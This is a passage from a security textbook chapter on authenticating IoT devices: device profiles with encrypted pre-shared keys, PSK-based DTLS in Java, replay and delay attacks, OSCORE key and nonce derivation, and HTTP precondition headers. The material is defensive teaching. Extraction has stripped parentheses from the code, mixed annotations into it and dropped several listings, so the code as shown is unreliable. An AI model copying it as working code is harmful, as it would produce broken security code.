security technology, OAuth2 is also popular for IoT  applications,  so  you’ll  learn  about  recent  adaptations  of  OAuth2  for  con- strained devices in section 13.3. Finally, we’ll look at how to manage access control decisions  when  a  device  may  be  disconnected  from  other  services  for  prolonged periods of time in section 13.4.  488   Authenticating devices  489  13.1 Authenticating devices  In consumer IoT applications, devices are often acting under the control of a user, but industrial IoT devices are typically designed to act autonomously without manual user intervention. For example, a system monitoring supply levels in a warehouse would be configured to automatically order new stock when levels of critical supplies become low. In these cases, IoT devices act under their own authority much like the service-to- service API calls in chapter 11. In chapter 12, you saw how to provision credentials to devices to secure IoT communications, and in this section, you’ll see how to use those to authenticate devices to access APIs.  13.1.1 Identifying devices  To be able to identify clients and make access control decisions about them in your API, you need to keep track of legitimate device identifiers and other attributes of the devices and link those to the credentials that device uses to authenticate. This allows you  to  look  up  these  device  attributes  after  authentication  and  use  them  to  make access control decisions. The process is very similar to authentication for users, and you could reuse an existing user repository such as LDAP to also store device profiles, although it is usually safer to separate users from device accounts to avoid confusion. Where  a  user  profile  typically  includes  a  hashed  password  and  details  such  as  their name  and  address,  a  device  profile  might  instead  include  a  pre-shared  key  for  that device, along with manufacturer and model information, and the location of where that device is deployed.    The device profile can be generated at the point the device is manufactured, as shown in figure 13.1. Alternatively, the profile can be built when devices are first deliv- ered to an organization, in a process known as onboarding.  Device details and identiﬁers are combined into a device proﬁle and stored in a central repository.  Factory  Device provisioning  Device details + encrypted PSK  Device directory   LDAP   Device  Device  Device  Unique device identiﬁers and credentials are deployed to the device during manufacturing or onboarding.  Figure 13.1 Device details and unique identifiers are stored in a shared  repository where they can be accessed later.   490  CHAPTER 13 Securing IoT APIs  DEFINITION Device onboarding is the process of deploying a device and register- ing it with the services and networks it needs to access.  Listing  13.1  shows  code  for  a  simple  device  profile  with  an  identifier,  basic  model information, and an encrypted pre-shared key  PSK  that can be used to communi- cate with the device using the techniques in chapter 12. The PSK will be encrypted using the NaCl SecretBox class that you used in chapter 6, so you can add a method to  decrypt  the  PSK  with  a  secret  key.  Navigate  to  src main java com manning  apisecurityinaction and create a new file named Device.java and copy in the contents of the listing.  Listing 13.1 A device profile  package com.manning.apisecurityinaction;  import org.dalesbred.Database; import org.dalesbred.annotation.DalesbredInstantiator; import org.h2.jdbcx.JdbcConnectionPool; import software.pando.crypto.nacl.SecretBox;  import java.io.*; import java.security.Key; import java.util.Optional;  public class Device {     final String deviceId;            final String manufacturer;        final String model;               final byte[] encryptedPsk;     Create fields  for the device  attributes.      @DalesbredInstantiator                            public Device String deviceId, String manufacturer,                    String model, byte[] encryptedPsk  {         this.deviceId = deviceId;         this.manufacturer = manufacturer;         this.model = model;         this.encryptedPsk = encryptedPsk;     }  Annotate the constructor  so that Dalesbred knows  how to load a device from  the database.  Add a method to decrypt the device PSK using NaCl’s SecretBox.      public byte[] getPsk Key decryptionKey  {                                 try  var in = new ByteArrayInputStream encryptedPsk   {                   var box = SecretBox.readFrom in ;                                     return box.decrypt decryptionKey ;                                } catch  IOException e  {                                                 throw new RuntimeException "Unable to decrypt PSK", e ;           }                                                                 }                                                                 }  You can now populate the database with device profiles. Listing 13.2 shows how to ini- tialize the database with an example device profile and encrypted PSK. Just like previ- ous  chapters  you  can  use  a  temporary  in-memory  H2  database  to  hold  the  device   Create and load the in-memory device database.  Serialize the example encrypted PSK to a byte array.  Authenticating devices  491  details, because this makes it easy to test. In a production deployment you would use a database  server  or  LDAP  directory.  You  can  load  the  database  into  the  Dalesbred library that you’ve used since chapter 2 to simplify queries. Then you should create the table to hold the device profiles, in this case with simple string attributes  VARCHAR in  SQL  and a binary attribute to  hold the encrypted PSK. You could extract these SQL statements into a separate schema.sql file as you did in chapter 2, but because there is only a single table, I’ve used string literals instead. Open the Device.java file again and add the new method from the listing to create the example device database.  Listing 13.2 Populating the device database  static Database createDatabase SecretBox encryptedPsk  throws IOException {     var pool = JdbcConnectionPool.create "jdbc:h2:mem:devices",                 "devices", "password" ;                                     var database = Database.forDataSource pool ;                         database.update "CREATE TABLE devices " +                          "device_id VARCHAR 30  PRIMARY KEY," +                     "manufacturer VARCHAR 100  NOT NULL," +                    "model VARCHAR 100  NOT NULL," +                           "encrypted_psk VARBINARY 1024  NOT NULL " ;     Create a table  to hold device  details and  encrypted PSKs.      var out = new ByteArrayOutputStream  ;         encryptedPsk.writeTo out ;                     database.update "INSERT INTO devices " +                                    "device_id, manufacturer, model, encrypted_psk  " +                 "VALUES ?, ?, ?, ? ", "test", "example", "ex001",                   out.toByteArray   ;                                      Insert an  example  device into  the database.      return database; }  You’ll also need a way to find a device by its device ID or other attributes. Dalesbred makes this quite simple, as shown in listing 13.3. The findOptional method can be used  to  search  for  a  device;  it  will  return  an  empty  result  if  there  is  no  matching device. You should select the fields of the device table in exactly the order they appear in the Device class constructor in listing 13.1. As described in chapter 2, use a bind parameter in the query to supply the device ID, to avoid SQL injection attacks.  Listing 13.3 Finding a device by ID  Use the findOptional method with  your Device class to load devices.  Select device attributes in the same order they appear in the constructor.  static Optional  find Database database, String deviceId  {     return database.findOptional Device.class,                                      "SELECT device_id, manufacturer, model, encrypted_psk " +                       "FROM devices WHERE device_id = ?", deviceId ;     }  Use a bind parameter to query for a device with the matching device_id.   492  CHAPTER 13 Securing IoT APIs  Now  that  you  have  some  device  details,  you  can  use  them  to  authenticate  devices and perform access control based on those device identities, which you’ll do in sec- tions 13.1.2 and 13.1.3.  13.1.2 Device certificates  An alternative to storing device details directly in a database is to instead provide each device  with  a  certificate  containing  the  same  details,  signed  by  a  trusted  certificate authority.  Although  traditionally  certificates  are  used  with  public  key  cryptography, you  can  use  the  same  techniques  for  constrained  devices  that  must  use  symmetric cryptography instead. For example, the device can be issued with a signed JSON Web Token  that  contains  device  details  and  an  encrypted  PSK  that  the  API  server  can decrypt, as shown in listing 13.4. The device treats the certificate as an opaque token and simply presents it to APIs that it needs to access. The API trusts the JWT because it is signed by a trusted issuer, and it can then decrypt the PSK to authenticate and com- municate with the device.  Listing 13.4 Encrypted PSK in a JWT claims set  {     "iss":"https:  example.com devices",                  "iat":1590139506,                                     "exp":1905672306,                                     "sub":"ada37d7b-e895-4d55-9571-4df602e60c27",         "psk":" jZvara1OnqqBZrz1HtvHBCNjXvCJptEuIAAAAJInAtaLFnYna9K0WxX4_    ➥ IGPyztb8VUwo0CI_UmqDQgm"                                             }  Include the usual JWT  claims identifying the  device.  Add an encrypted PSK that can be used to communicate with the device.  This  can  be  more  scalable  than  a  database  if  you  have  many  devices,  but  makes  it harder to update incorrect details or change keys. A middle ground is provided by the attestation techniques discussed in chapter 12, in which an initial certificate and key are used to prove the make and model of a device when it first registers on a network, and it then negotiates a device-specific key to use from then on.  13.1.3 Authenticating at the transport layer  If there is a direct connection between a device and the API it’s accessing, then you can use authentication mechanisms provided by the transport layer security protocol. For example, the pre-shared key  PSK  cipher suites for TLS described in chapter 12 pro- vide mutual authentication of both the client and the server. Client certificate authenti- cation can be used  by  more  capable devices  just  as you  did in chapter  11 for service clients. In this section, we’ll look at identifying devices using PSK authentication.   During the handshake, the client provides a PSK identity to the server in the Client- KeyExchange message. The API can use this PSK ID to locate the correct PSK for that client. The server can look up the device profile for that device using the PSK ID at the same time that it loads the PSK, as shown in figure 13.2. Once the handshake   Authenticating devices  493  Device  API  Device DB  PSK ID  Lookup device proﬁle  The device supplies an identiﬁer for the preshared key at the start of the handshake.  Device proﬁle with  encrypted PSK  Decrypt PSK  The API looks up the device proﬁle and encrypted PSK in the device database.  TLS handshake with PSK  The API decrypts the PSK and then continues the handshake with that key.  Figure 13.2  When the device connects to the API, it sends a PSK identifier in the TLS  ClientKeyExchange message. The API can use this to find a matching device profile with  an encrypted PSK for that device. The API decrypts the PSK and then completes the TLS  handshake using the PSK to authenticate the device.  has completed, the API is assured of the device identity by the mutual authentication that PSK cipher suites achieve.   In this section, you’ll adjust the PskServer from chapter 12 to look up the device profile during authentication. First, you need to load and initialize the device data- base. Open the PskServer.java file and add the following lines at the start of the main   method just after the PSK is loaded:  The existing line to load the example PSK var psk = loadPsk args[0].toCharArray   ;     var encryptionKey = SecretBox.key  ;           var deviceDb = Device.createDatabase                       SecretBox.encrypt encryptionKey, psk  ;     Create a new PSK  encryption key.  Initialize the database  with the encrypted PSK.  The client will present its device identifier as the PSK identity field during the hand- shake, which you can then use to find the associated device profile and encrypted PSK to use to authenticate the session. Listing 13.5 shows a new DeviceIdentityManager class that you can use with Bouncy Castle instead of the existing PSK identity manager. The new identity manager performs a lookup in the device database to find a device that matches the PSK identity supplied by the client. If a matching device is found, then  you  can  decrypt  the  associated  PSK  from  the  device  profile  and  use  that  to authenticate  the  TLS  connection.  Otherwise,  return  null  to  abort  the  connection. The client doesn’t need any hint to determine its own identity, so you can also return   494  CHAPTER 13 Securing IoT APIs  null from the getHint   method to disable the ServerKeyExchange message in the handshake  just  as  you  did  in  chapter  12.  Create  a  new  file  named  DeviceIdentity- Manager.java in the same folder as the Device.java file you created earlier and add the contents of the listing.  Listing 13.5 The device IdentityManager  package com.manning.apisecurityinaction; import org.bouncycastle.tls.TlsPSKIdentityManager; import org.dalesbred.Database; import java.security.Key; import static java.nio.charset.StandardCharsets.UTF_8;  public class DeviceIdentityManager implements TlsPSKIdentityManager {     private final Database database;                     private final Key pskDecryptionKey;                   public DeviceIdentityManager Database database, Key pskDecryptionKey  {         this.database = database;                            this.pskDecryptionKey = pskDecryptionKey;        }  Initialize the identity manager with the device database and PSK decryption key.      @Override     public byte[] getHint   {            return null;                 }                             Return a null identity hint to  disable the ServerKeyExchange  message.      @Override     public byte[] getPSK byte[] identity  {         var deviceId = new String identity, UTF_8 ;            return Device.find database, deviceId                          .map device -> device.getPsk pskDecryptionKey                        .orElse null ;          } }  Otherwise, return null to abort the connection.  If the device exists, then decrypt the associated PSK.  Convert the PSK  identity hint into a  UTF-8 string to use as  the device identity.  To use the new device identity manager, you need to update the PskServer class again. Open PskServer.java in your editor and change the lines of code that create the PSK- TlsServer object to use the new class. I’ve highlighted the new code in bold:  var crypto = new BcTlsCrypto new SecureRandom   ; var server = new PSKTlsServer crypto,         new DeviceIdentityManager deviceDb, encryptionKey   {  You can delete the old getIdentityManager   method too because it is unused now. You also need to adjust the PskClient implementation to send the correct device ID during the handshake. If you recall from chapter 12, we used an SHA-512 hash of the PSK as the ID there, but the device database uses the ID "test" instead. Open Psk- Client.java and change the pskId variable at the top of the main   method to use the UTF-8 bytes of the correct device ID:  var pskId = "test".getBytes UTF_8 ;   Authenticating devices  495  If you now run the PskServer and then the PskClient it will still work correctly, but now it is using the encrypted PSK loaded from the device database. EXPOSING THE DEVICE IDENTITY TO THE API Although you are now authenticating the device based on a PSK attached to its device profile, that device profile is not exposed to the API after the handshake completes. Bouncy Castle doesn’t provide a public method to get the PSK identity associated with a connection, but it is easy to expose this yourself by adding a new method to the PSK- TlsServer, as shown in listing 13.6. A protected variable inside the server contains the TlsContext class, which has information about the connection  the server supports only a single client at a time . The PSK identity is stored inside the SecurityParameters class for the connection. Open the PskServer.java file and add the new method high- lighted in bold in the listing. You can then retrieve the device identity after receiving a message by calling:  var deviceId = server.getPeerDeviceIdentity  ;  CAUTION You should only trust the PSK identity returned from getSecurity- ParametersConnection  , which are the final parameters after the handshake completes. The similarly named getSecurityParametersHandshake   contains parameters negotiated during the handshake process before authentication has finished and may be incorrect.  Listing 13.6 Exposing the device identity  var server = new PSKTlsServer crypto,         new DeviceIdentityManager deviceDb, encryptionKey   {     @Override     protected ProtocolVersion[] getSupportedVersions   {         return ProtocolVersion.DTLSv12.only  ;     }     @Override     protected int[] getSupportedCipherSuites   {         return new int[] {                 CipherSuite.TLS_PSK_WITH_AES_128_CCM,                 CipherSuite.TLS_PSK_WITH_AES_128_CCM_8,                 CipherSuite.TLS_PSK_WITH_AES_256_CCM,                 CipherSuite.TLS_PSK_WITH_AES_256_CCM_8,                 CipherSuite.TLS_PSK_WITH_AES_128_GCM_SHA256,                 CipherSuite.TLS_PSK_WITH_AES_256_GCM_SHA384,                 CipherSuite.TLS_PSK_WITH_CHACHA20_POLY1305_SHA256         };     }  Add a new method to the  PSKTlsServer to expose  the client identity.      String getPeerDeviceIdentity   {              return new String context.getSecurityParametersConnection                       .getPSKIdentity  , UTF_8 ;                                  } Look up the PSK }; identity and decode it as a UTF-8 string.   496  CHAPTER 13 Securing IoT APIs  The API server can then use this device identity to look up permissions for this device, using the same identity-based access control techniques used for users in chapter 8.  Pop quiz 1  True or False: A PSK ID is always a UTF-8 string.  2 Why should you only trust the PSK ID after the handshake completes?  a Before the handshake completes, the ID is encrypted. b You should never trust anyone until you’ve shaken their hand. c The ID changes after the handshake to avoid session fixation attacks. d Before the handshake completes, the ID is unauthenticated so it could be fake.  The answers are at the end of the chapter.  13.2 End-to-end authentication  If the connection from the device to the API must pass through different protocols, as described in chapter 12, authenticating devices at the transport layer is not an option. In chapter 12, you learned how to secure end-to-end API requests and responses using authenticated encryption with Concise Binary Object Representation  CBOR  Object Signing and Encryption  COSE  or NaCl’s CryptoBox. These encrypted message for- mats ensure that requests cannot be tampered with, and the API server can be sure that the request originated from the device it claims to be from. By adding a device identifier  to  the  message  as  associated  data.1  which  you’ll  recall  from  chapter  6  is authenticated but not encrypted, the API can look up the device profile to find the key to decrypt and authenticate messages from that device.   Unfortunately, this is not enough to ensure that API requests really did come from that  device,  so  it  is  dangerous  to  make  access control  decisions  based  solely on  the Message Authentication Code  MAC  used to authenticate the message. The reason is that API requests can be captured by an attacker and later replayed to perform the same action again at a later time, known as a replay attack. For example, suppose you are the leader of a clandestine evil organization intent on world domination. A moni- toring device in your uranium enrichment plant sends an API request to increase the speed of a centrifuge. Unfortunately, the request is intercepted by a secret agent, who then replays the request hundreds of times, and the centrifuge spins too quickly, caus- ing irreparable damage and delaying your dastardly plans by several years.  DEFINITION In  a  replay  attack,  an  attacker  captures  genuine  API  requests  and later replays them to cause actions that weren’t intended by the original client. Replay attacks can cause disruption even if the message itself is authenticated.  1 One of the few drawbacks of the NaCl CryptoBox and SecretBox APIs is that they don’t allow authenticated  associated data.   End-to-end authentication  497  To prevent replay attacks, the API needs to ensure that a request came from a legiti- mate client and is fresh. Freshness ensures that the message is recent and hasn’t been replayed and is critical to security when making access control decisions based on the identity  of  the  client.  The  process  of  identifying  who  an  API  server  is  talking  to  is known as entity authentication.  DEFINITION Entity authentication is the process of identifying who requested an API operation to be performed. Although message authentication can confirm who originally authored a request, entity authentication additionally requires that the request is fresh and has not been replayed. The connection between the two kinds of authentication can be summed up as: entity authentication = message authentication + freshness.  In previous chapters, you’ve relied on TLS or authentication protocols such as OpenID Connect  OIDC; see chapter 7  to ensure freshness, but end-to-end API requests need to ensure this property for themselves. There are three general ways to ensure freshness:  API requests can include timestamps that indicate when the request was gener- ated. The API server can then reject requests that are too old. This is the weak- est form of replay protection because an attacker can still replay requests until they  expire.  It  also  requires  the  client  and  server  to  have  access  to  accurate clocks that cannot be influenced by an attacker.   Requests can include a unique nonce  number-used-once . The server remem- bers  these  nonces  and  rejects  requests  that  attempt  to  reuse  one  that  has already  been  seen.  To  reduce  the  storage  requirements  on  the  server,  this  is often combined with a timestamp, so that used nonces only have to be remem- bered until the associated request expires. In some cases, you may be able to use a monotonically increasing counter as the nonce, in which case the server only needs to remember the highest value it has seen so far and reject requests that use a smaller value. If multiple clients or servers share the same key, it can be difficult to synchronize the counter between them all.   The most secure method is to use a challenge-response protocol shown in figure 13.3, in which the server generates a random challenge value  a nonce  and sends it to the client. The client then includes the challenge value in the API request, proving  that  the  request  was  generated  after  the  challenge.  Although  more secure, this adds overhead because the client must talk to the server to obtain a challenge before they can send any requests.  DEFINITION A  monotonically  increasing  counter  is  one  that  only  ever  increases and never goes backward and can be used as a nonce to prevent replay of API requests.  In  a  challenge-response  protocol,  the  server  generates  a  random  chal- lenge that the client includes in a subsequent request to ensure freshness.  Both  TLS  and  OIDC  employ  challenge-response  protocols  for  authentication.  For example, in OIDC the client includes a random nonce in the authentication request   498  CHAPTER 13 Securing IoT APIs  The client’s initial request is rejected by the API, which sends a random challenge to the client.  Device  API  Initial request  Challenge  Response  The client repeats its request including a response to the challenge.  The API can be sure that the client’s new request must be more recent than the challenge, ensuring freshness.  Figure 13.3 A challenge-response protocol ensures that an API request is  fresh and has not been replayed by an attacker. The client’s first API request  is rejected, and the API generates a random challenge value that it sends to  the client and stores locally. The client retries its request, including a response  to the challenge. The server can then be sure that the request has been freshly  generated by the genuine client and is not a replay attack.  and  the  identity  provider  includes  the  same  nonce  in  the  generated  ID  token  to ensure freshness. However, in both cases the challenge is only used to ensure fresh- ness of an initial authentication request and then other methods are used from then on. In TLS, the challenge response happens during the handshake, and afterward a monotonically increasing sequence number is added to every message. If either side sees the sequence number go backward, then they abort the connection and a new handshake  and new challenge response  needs to be performed. This relies on the fact that TLS is a stateful protocol between a single client and a single server, but this can’t  generally  be  guaranteed  for  an  end-to-end  security  protocol  where  each  API request may go to a different server.  Attacks from delaying, reordering, or blocking messages Replay attacks are not the only way that an attacker may interfere with API requests and  responses.  They  may  also  be  able  to  block  or  delay  messages  from  being received, which can cause security issues in some cases, beyond simple denial of service. For example, suppose a legitimate client sends an authenticated “unlock” request to a door-lock device. If the request includes a unique nonce or other mech- anism described in this section, then an attacker won’t be able to replay the request   13.2.1 OSCORE  End-to-end authentication  499  later. However, they can prevent the original request being delivered immediately and then send it to the device later, when the legitimate user has given up and walked away. This is not a replay attack because the original request was never received by the API; instead, the attacker has merely delayed the request and delivered it at a later  time  than  was  intended.  http:  mng.bz nzYK  describes  a  variety  of  attacks against CoAP that don’t directly violate the security properties of DTLS, TLS, or other secure communication protocols. These examples illustrate the importance of good threat modeling and carefully examining assumptions made in device communica- tions. A variety of mitigations for CoAP are described in http:  mng.bz v9oM, includ- ing a simple challenge-response “Echo” option that can be used to prevent delay attacks, ensuring a stronger guarantee of freshness.  Object Security for Constrained RESTful Environments  OSCORE; https:  tools.ietf .org html rfc8613  is designed to be an end-to-end security protocol for API requests in IoT environments. OSCORE is based on the use of pre-shared keys between the cli- ent and server and makes use of CoAP  Constrained Application Protocol  and COSE  CBOR  Object  Signing  and  Encryption   so  that  cryptographic  algorithms  and  mes- sage formats are suitable for constrained devices.  NOTE OSCORE can be used either as an alternative to transport layer secu- rity protocols such as DTLS or in addition to them. The two approaches are complimentary, and the best security comes from combining both. OSCORE doesn’t encrypt all parts of the messages being exchanged so TLS or DTLS provides additional protection, while OSCORE ensures end-to-end security.  To use OSCORE, the client and server must maintain a collection of state, known as the security context, for the duration of their interactions with each other. The secu- rity context consists of three parts, shown in figure 13.4:   A Common Context, which describes the cryptographic algorithms to be used and contains a Master Secret  the PSK  and an optional Master Salt. These are used to derive keys and nonces used to encrypt and authenticate messages, such as the Common IV, described later in this section.   A Sender Context, which contains a Sender ID, a Sender Key used to encrypt mes- sages sent by this device, and a Sender Sequence Number. The sequence num- ber is a nonce that starts at zero and is incremented every time the device sends a message.   A Recipient Context, which contains a Recipient ID, a Recipient Key, and a Replay  Window, which is used to detect replay of received messages.   WARNING Keys  and  nonces  are  derived  deterministically  in  OSCORE,  so  if the same security context is used more than once, then catastrophic nonce reuse can occur. Devices must either reliably store the context state for the   500  CHAPTER 13 Securing IoT APIs  The client and server begin with a shared Master Key  PSK , Master Salt, and ID Context.  The Sender Context of the client corresponds to the Recipient Context on the server, and vice versa.  The server maintains a window of recently used sequence numbers to prevent replay of client requests.

Figure 13.4 The OSCORE context is maintained by the client and server and consists of three  parts: a common context contains a Master Key, Master Salt, and Common IV component.  Sender and Recipient Contexts are derived from this common context and IDs for the sender  and recipient. The context on the server mirrors that on the client, and vice versa.  life of the Master Key  including across device restarts  or else negotiate fresh random parameters for each session.  DERIVING THE CONTEXT The Sender ID and Recipient ID are short sequences of bytes and are typically only allowed to be a few bytes long, so they can’t be globally unique names. Instead, they   End-to-end authentication  501  are used to distinguish the two parties involved in the communication. For example, some OSCORE implementations use a single 0 byte for the client, and a single 1 byte for the server. An optional ID Context string can be included in the Common Con- text, which can be used to map the Sender and Recipient IDs to device identities, for example in a lookup table.    The  Master  Key  and  Master  Salt  are  combined  using  the  HKDF  key  derivation function  that  you  first  used  in  chapter  11.  Previously,  you’ve  only  used  the  HKDF- Expand function, but this combination is done using the HKDF-Extract method that is intended for inputs that are not uniformly random. HKDF-Extract is shown in list- ing 13.7 and is just a single application of HMAC using the Master Salt as the key and the Master Key as the input. Open the HKDF.java file and add the extract method to the existing code.  Listing 13.7 HKDF-Extract  HKDF-Extract takes a random salt value and the input key material.  public static Key extract byte[] salt, byte[] inputKeyMaterial             throws GeneralSecurityException {     var hmac = Mac.getInstance "HmacSHA256" ;     if  salt == null  {                                    salt = new byte[hmac.getMacLength  ];          }                                                  hmac.init new SecretKeySpec salt, "HmacSHA256"  ;                return new SecretKeySpec hmac.doFinal inputKeyMaterial ,                 "HmacSHA256" ; }  If a salt is not  provided, then an  all-zero salt is used.  The result is the output of HMAC using the salt as the key and the key material as the input.  The HKDF key for OSCORE can then be calculated from the Master Key and Master Salt as follows:  var hkdfKey = HKDF.extract masterSalt, masterKey ;  The sender and recipient keys are then derived from this master HKDF key using the HKDF-Expand function from chapter 10, as shown in listing 13.8. A context argument is generated as a CBOR array, containing the following items in order:   The Sender ID or Recipient ID, depending on which key is being derived.  The ID Context parameter, if specified, or a zero-length byte array otherwise.  The  COSE  algorithm  identifier  for  the  authenticated  encryption  algorithm  being used.   The string “Key” encoded as a CBOR binary string in ASCII.  The size of the key to be derived, in bytes.  This is then passed to the HKDF.expand   method to derive the key. Create a new file named  Oscore.java  and  copy  the  listing  into  it.  You’ll  need  to  add  the  following imports at the top of the file:   502  CHAPTER 13 Securing IoT APIs  import COSE.*; import com.upokecenter.cbor.CBORObject; import org.bouncycastle.jce.provider.BouncyCastleProvider; import java.nio.*; import java.security.*;  Listing 13.8 Deriving the sender and recipient keys  private static Key deriveKey Key hkdfKey, byte[] id,     byte[] idContext, AlgorithmID coseAlgorithm          throws GeneralSecurityException {      int keySizeBytes = coseAlgorithm.getKeySize     8;     CBORObject context = CBORObject.NewArray  ;           context.Add id ;                                      context.Add idContext ;                               context.Add coseAlgorithm.AsCBOR   ;                  context.Add CBORObject.FromObject "Key"  ;            context.Add keySizeBytes ;                             return HKDF.expand hkdfKey, context.EncodeToBytes  ,                 keySizeBytes, "AES" ;                            }  The context is a CBOR  array containing the ID,  ID context, algorithm  identifier, and key size.  HKDF-Expand is used  to derive the key  from the master  HKDF key.  The Common IV is derived in almost the same way as the sender and recipient keys, as shown in listing 13.9. The label “IV” is used instead of “Key,” and the length of the IV or nonce used by the COSE authenticated encryption algorithm is used instead of the key size. For example, the default algorithm is AES_CCM_16_64_128, which requires a 13-byte nonce, so you would pass 13 as the ivLength argument. Because our HKDF implementation returns a Key object, you can use the getEncoded   method to con- vert  that  into  the  raw  bytes  needed  for  the  Common  IV.  Add  this  method  to  the Oscore class you just created.

Listing  13.10  shows  an  example  of  deriving  the  sender  and  recipient  keys  and Common IV based on the test case from appendix C of the OSCORE specification   End-to-end authentication  503   https:  tools.ietf.org html rfc8613appendix-C.1.1 .

GENERATING NONCES The Common IV is not used directly to encrypt data because it is a fixed value, so would immediately result in nonce reuse vulnerabilities. Instead the nonce is derived from a combination of the Common IV, the sequence number  called the Partial IV , and the ID of the sender, as shown in listing 13.11. First the sequence number is checked to make sure it fits in 5 bytes, and the Sender ID is checked to ensure it will fit in the remainder of the IV. This puts significant constraints on the maximum size of the Sender ID. A packed binary array is generated consisting of the following items, in order:   The length of the Sender ID as a single byte  The sender ID itself, left-padded with zero bytes until it is 6 bytes less than the  total IV length   The sequence number encoded as a 5-byte big-endian integer  The resulting array is then combined with the Common IV using bitwise XOR, using the following method:  private static byte[] xor byte[] xs, byte[] ys  {     for  int i = 0; i < xs.length; ++i                       xs[i] ^= ys[i];                                  return xs;            }  Return the  updated result.  XOR each element of the  second array  ys  into the  corresponding element of  the first array  xs .   504  CHAPTER 13 Securing IoT APIs  Add the xor   method and the nonce   method from listing 13.11 to the Oscore class.  NOTE Although  the  generated  nonce  looks  random  due  to  being  XORed with the Common IV, it is in fact a deterministic counter that changes pre- dictably  as  the  sequence  number  increases.  The  encoding  is  designed  to reduce the risk of accidental nonce reuse.  Listing 13.11 Deriving the per-message nonce  private static byte[] nonce int ivLength, long sequenceNumber,                             byte[] id, byte[] commonIv  {     if  sequenceNumber >  1L << 40                     throw new IllegalArgumentException                 "Sequence number too large" ;          int idLen = ivLength - 6;                                        if  id.length > idLen                                                throw new IllegalArgumentException "ID is too large" ;    Check the sequence  number is not too large.

XOR the result with the Common  IV to derive the final nonce.  ENCRYPTING A MESSAGE Once you’ve derived the per-message nonce, you can encrypt an OSCORE message, as shown in listing 13.12, which is based on the example in section C.4 of the OSCORE specification. OSCORE messages are encoded as COSE_Encrypt0 structures, in which there  is  no  explicit  recipient  information.  The  Partial  IV  and  the  Sender  ID  are encoded into the message as unprotected headers, with the Sender ID using the stan- dard COSE Key ID  KID  header. Although marked as unprotected, those values are actually authenticated because OSCORE requires them to be included in a COSE external additional authenticated data structure, which is a CBOR array with the follow- ing elements:   An OSCORE version number, currently always set to 1  The COSE algorithm identifier  The Sender ID  The Partial IV  An  options  string.  This  is  used  to  encode  CoAP  headers  but  is  blank  in  this  example.  The COSE structure is then encrypted with the sender key.

Generate the  nonce and  encode the  Partial IV.  var associatedData = CBORObject.NewArray  ;            associatedData.Add 1 ;                                 associatedData.Add algorithm.AsCBOR   ;                associatedData.Add senderId ;                          associatedData.Add partialIv ;                         associatedData.Add new byte[0] ;                       message.setExternal associatedData.EncodeToBytes   ;    Security.addProvider new BouncyCastleProvider   ;    message.encrypt senderKey.getEncoded   ;              Encode the external  associated data.  Ensure Bouncy Castle is  loaded for AES-CCM support,  then encrypt the message.  The encrypted message is then encoded into the application protocol, such as CoAP or HTTP and sent to the recipient. Details of this encoding are given in section 6 of the OSCORE specification. The recipient can recreate the nonce from its own recip- ient security context, together with the Partial IV and Sender ID encoded into the message.    The  recipient  is  responsible  for  checking  that  the  Partial  IV  has  not  been  seen before to prevent replay attacks. When OSCORE is transmitted over a reliable proto- col such as HTTP, this can be achieved by keeping track of the last Partial IV received and ensuring that any new messages always use a larger number. For unreliable proto- cols such as CoAP over UDP, where messages may arrive out of order, you can use the algorithm from RFC 4303  http:  mng.bz 4BjV . This approach maintains a window of  allowed  sequence  numbers  between  a  minimum  and  maximum  value  that  the recipient  will  accept  and  explicitly  records  which  values  in  that  range  have  been received. If the recipient is a cluster of servers, such as a typical cloud-hosted API, then this state must be synchronized between all servers to prevent replay attacks. Alterna- tively, sticky load balancing can be used to ensure requests from the same device are always  delivered  to  the  same  server  instance,  shown  in  figure  13.5,  but  this  can  be   506  CHAPTER 13 Securing IoT APIs  In normal load balancing, each request from a device can be sent to any server, providing best use of resources.  Device 1  Device 2  Device 3  Device 4  Load balancer  Server 2  Server 1  Server 3  With sticky load balancing, all requests from the same device always go to the same server.  Figure 13.5 In sticky load balancing, all requests from one  device are always handled by the same server. This simplifies  state management but reduces scalability and can cause  problems if that server restarts or is removed from the cluster.  problematic in environments where servers are frequently added or removed. Sec- tion 13.1.5 discusses an alternative approach to preventing replay attacks that can be effective to REST APIs.  DEFINITION Sticky load balancing is a setting supported by most load balancers that ensures that API requests from a device or client are always delivered to the same server instance. Although this can help with stateful connections, it can harm scalability and is generally discouraged.  13.2.2 Avoiding replay in REST APIs  All solutions to message replay involve the client and server maintaining some state. However, in some cases you can avoid the need for per-client state to prevent replay. For example, requests that only read data are harmless if replayed, so long as they do not require significant processing on the server and the responses are kept confiden- tial. Some requests that perform operations are also harmless to replay if the request is idempotent.  DEFINITION An operation is idempotent if performing it multiple times has the same effect as performing it just once. Idempotent operations are important for reliability because if a request fails because of a network error, the client can safely retry it.   End-to-end authentication  507  The HTTP specification requires the read-only methods GET, HEAD, and OPTIONS, along  with  PUT  and  DELETE  requests,  to  all  be  idempotent.  Only  the  POST  and PATCH methods are not generally idempotent.   WARNING Even  if  you  stick  to  PUT  requests  instead  of  POST,  this  doesn’t mean that your requests are always safe from replay.  The problem is that the definition of idempotency says nothing about what happens if another request occurs in between the original request and the replay. For example, suppose you send a PUT request updating a page on a website, but you lose your net- work  connection  and  do  not  know  if  the  request  succeeded  or  not.  Because  the request is idempotent, you send it again. Unknown to you, one of your colleagues in the  meantime  sent  a  DELETE  request  because  the  document  contained  sensitive information that shouldn’t have been published. Your replayed PUT request arrives afterwards, and the document is resurrected, sensitive data and all. An attacker can replay requests to restore an old version of a resource, even though all the operations were individually idempotent.    Thankfully,  there  are  several  mechanisms  you  can  use  to  ensure  that  no  other request has occurred in the meantime. Many updates to a resource follow the pattern of  first  reading  the  current  version  and  then  sending  an  updated  version.  You  can ensure that nobody has changed the resource since you read it using one of two stan- dard HTTP mechanisms:   The  server  can  return  a  Last-Modified  header  when  reading  a  resource  that indicates the date and time when it was last modified. The client can then send an If-Unmodified-Since header in its update request with the same timestamp. If the resource has changed in the meantime, then the request will be rejected with  a  412  Precondition  Failed  status.2  The  main  downside  of  Last-Modified headers is that they are limited to the nearest second, so are unable to detect changes occurring more frequently.   Alternatively,  the  server  can  return  an  ETag   Entity  Tag   header  that  should change  whenever  the  resource  changes  as  shown  in  figure  13.6.  Typically,  the ETag is either a version number or a cryptographic hash of the contents of the resource. The client can then send an If-Matches header containing the expected ETag when it performs an update. If the resource has changed in the  meantime,  then  the  ETag  will  be  different  and  the  server  will  respond with a 412 status-code and reject the request.  WARNING Although  a  cryptographic  hash  can  be  appealing  as  an  ETag,  it does mean that the ETag will revert to a previous value if the content does. This allows an attacker to replay any old requests with a matching ETag. You  2  If the server can determine that the current state of the resource happens to match the requested state, then it can also return a success status code as if the request 